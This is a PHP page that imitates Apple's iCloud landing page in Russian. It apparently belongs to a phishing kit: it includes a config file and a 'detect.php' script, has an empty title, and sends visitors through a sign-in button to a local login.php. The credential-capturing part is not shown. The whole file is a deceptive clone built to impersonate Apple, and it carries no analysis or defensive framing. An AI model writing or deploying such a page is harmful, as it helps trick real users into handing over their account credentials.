<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');
?>
<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
      <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title></title>
      <link rel="stylesheet" href="css/index.css">
   </head>
   <body>
      <div id="root">
         <panel>
            <div class="root-viewport">
               <div class="root-component">
                  <div class="page-viewport landing-page-route fade-in">
                     <div class="page-content">
                        <?php include_once('html_modules/header.php'); ?>
                        <main>
                           <div class="landing-page">
                              <div class="hero-wrapper">
                                 <div class="animated-hero">
                                    <video src="media/fpo@1x.mp4" muted width="430" height="388" autoplay="" playsinline="" loop="" x-webkit-airplay="deny" title="Animation showing different users' Memojis surrounded by the icons of the apps the user personally uses most"></video>
                                 </div>
                                 <div class="landing-page-hero">
                                    <div class="clouds"></div>
                                    <h1>iCloud</h1>
                                 </div>
                              </div>
                              <div class="landing-page-content">
                                <a href="login.php">
                                 <ui-button class="push primary sign-in-button mouse" tabindex="0" ontouchstart="void(0)" role="button" aria-haspopup="false"><button type="button" tabindex="-1"></button>Войти</ui-button></a>
                                 <h2 class="description">Лучшее место для всех ваших фотографий, файлов, заметок, почты и многого другого.</h2>
                              </div>
                           </div>
                        </main>
                        <?php include_once('html_modules/footer.php'); ?>
                     </div>
                  </div>
               </div>
            </div>
        </panel>
      </div>
   </body>
</html>